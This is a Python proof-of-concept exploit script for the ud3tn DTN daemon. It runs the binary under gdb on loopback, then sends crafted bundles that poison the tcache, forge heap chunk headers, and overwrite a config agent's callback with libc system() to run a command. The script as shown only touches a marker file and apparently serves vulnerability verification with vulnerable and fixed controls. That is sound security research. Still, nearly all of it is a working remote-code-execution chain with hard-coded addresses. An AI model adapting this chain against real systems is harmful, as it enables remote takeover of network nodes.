#!/usr/bin/env python3
"""Loopback-only one-attempt probe: poison the tcache with the live config
agent's chunk, overwrite its trx_callback with system(), then deliver a bundle
to the config sink. Vulnerable / safe-input / fixed controls use the same wire.
"""
import os
import argparse
import pathlib
import socket
import subprocess
import sys
import time

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from wire_trigger import PREFIX_HEX, cbor_byte_string_header, sdnv_encode  # noqa: E402

P = 0x7FFFF0001040
F = 0x5555555B8BF0         # live config agent node in PIE brk heap, header 0x61 at F-8
SYSTEM = 0x7FFFF7C58750     # __libc_system under ASLR-off gdb
SINK_CONFIG = 0x5555555A7953  # "config" string in PIE rodata
CMD_OFF = 0x200


def framed(bundle):
    return cbor_byte_string_header(len(bundle)) + bundle


def custom_bundle(payload, eid_len, seq, config=False):
    prefix = bytearray.fromhex(PREFIX_HEX)
    prefix[17] = seq
    prefix[12:17] = sdnv_encode(int(time.time()))
    if config:
        # Point destination EID SSP at the 18-byte dictionary entry at
        # offset 24 (was "//attacker.dtn/app") and clear the admin flag.
        prefix[5] = 24
        prefix[45:63] = b"//ud3tn.dtn/config"
        prefix[2] = 0x10       # proc flags 0x90: no administrative record
    prefix[90] = eid_len
    n = 6 + len(payload)
    assert n < 16384
    if n < 128:
        prefix[84] = n
    else:
        prefix[84:85] = bytes([0x80 | (n >> 7), n & 0x7F])
    return framed(bytes(prefix) + bytes(payload))


def forged_payload(count, marker_path, eid_len, target):
    buf = bytearray(count)
    if eid_len != 0:
        return bytes(buf)

    def put(off, val, size=8):
        buf[off:off + size] = int(val).to_bytes(size, "little")

    put(0xF8, 0x61)           # record-8: 0x60 chunk, freed after F to shield it
    put(0x110, target)        # record->status_report = live config agent
    put(0x18, 0x25)           # preserve collateral chunk headers
    put(0x38, 0x65)
    put(0x98, 0x45)
    put(0xD8, 0x25)
    put(0x158, 0x1FE71)       # preserve top chunk size
    put(0x140, 2)             # IPN source EID: eid_free is a no-op
    cmd = b"touch " + str(marker_path).encode() + b"\0"
    assert len(cmd) < 0xF0
    buf[CMD_OFF:CMD_OFF + len(cmd)] = cmd
    return bytes(buf)


def agent_payload():
    buf = bytearray(0x48)

    def put(off, val):
        buf[off:off + 8] = int(val).to_bytes(8, "little")

    buf[0:8] = (0x0000000001010101).to_bytes(8, "little")  # keep auth flags
    put(0x10, SINK_CONFIG)    # keep the "config" sink identifier
    put(0x18, SYSTEM)         # trx_callback = system()
    put(0x20, 0)              # fib/bdm callbacks unused on this node
    put(0x28, 0)
    put(0x30, 0)              # is_alive_callback
    put(0x38, P + CMD_OFF)    # param -> command string in the crafted stream
    put(0x40, 2)              # agent_no
    return bytes(buf)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--port", type=int, default=23824)
    ap.add_argument("--forged-eid-len", type=int, default=0)
    ap.add_argument("--marker", required=True)
    ap.add_argument("--script", default=str(HERE / "call_chain.gdb"))
    args = ap.parse_args()
    outdir = pathlib.Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    marker = pathlib.Path(args.marker)
    marker.unlink(missing_ok=True)
    agent_file = outdir / "agent.addr"
    agent_file.unlink(missing_ok=True)
    os.environ["UD3TN_AGENT_FILE"] = str(agent_file)

    cmd = [
        "gdb", "-q", "-batch", "-x", args.script, "--args", args.binary,
        "-b", "6", "-e", "dtn://ud3tn.dtn/",
        "-c", f"mtcp:127.0.0.1,{args.port}",
        "-s", str(outdir / "chain.aap.sock"),
        "-S", str(outdir / "chain.aap2.sock"),
        "-L", "4",
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True)
    deadline = time.time() + 10

    sock = None
    while time.time() < deadline and sock is None:
        try:
            sock = socket.create_connection(("127.0.0.1", args.port), timeout=1)
        except OSError:
            if proc.poll() is not None:
                break
            time.sleep(0.1)

    def send(payload):
        if sock is None:
            return False
        try:
            sock.sendall(payload)
            return True
        except OSError:
            return False

    results = []
    target, hdr = None, None
    while time.time() < deadline + 5 and not agent_file.exists():
        time.sleep(0.1)
    if agent_file.exists():
        for line in agent_file.read_text().splitlines():
            ag, h, sink = [int(x, 16) for x in line.split()]
            if sink == SINK_CONFIG and (h & ~7) == 0x60:
                target, hdr = ag, h
                break
        print("discovered F:", hex(target) if target else None,
              "header:", hex(hdr) if hdr else None)
    if target is None:
        target = F                 # preserved fallback; discovery is evidence
    results.append(("pre", send(custom_bundle(b"A" * 64, 8, 1))))
    time.sleep(0.2)
    results.append(("forge", send(custom_bundle(
        forged_payload(768, marker, args.forged_eid_len, target),
        args.forged_eid_len, 2))))
    time.sleep(0.4)
    results.append(("follow", send(custom_bundle(agent_payload(), 0x48, 3))))
    time.sleep(0.4)
    results.append(("trigger", send(custom_bundle(b"B" * 64, 8, 4,
                                                  config=True))))
    try:
        out, _ = proc.communicate(timeout=12)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    (outdir / "chain.log").write_text(out)
    print("sent:", results, "rc:", proc.returncode,
          "marker:", marker.exists(), "log:", outdir / "chain.log")
    for line in out.splitlines():
        if line.startswith(("STORE", "FREE", "LIBC", "CALL_SITE", "SYSTEM",
                            "CHAIN")) or "invalid pointer" in line or \
                "SIG" in line or "ERROR: AddressSanitizer" in line:
            print("   ", line)


if __name__ == "__main__":
    main()
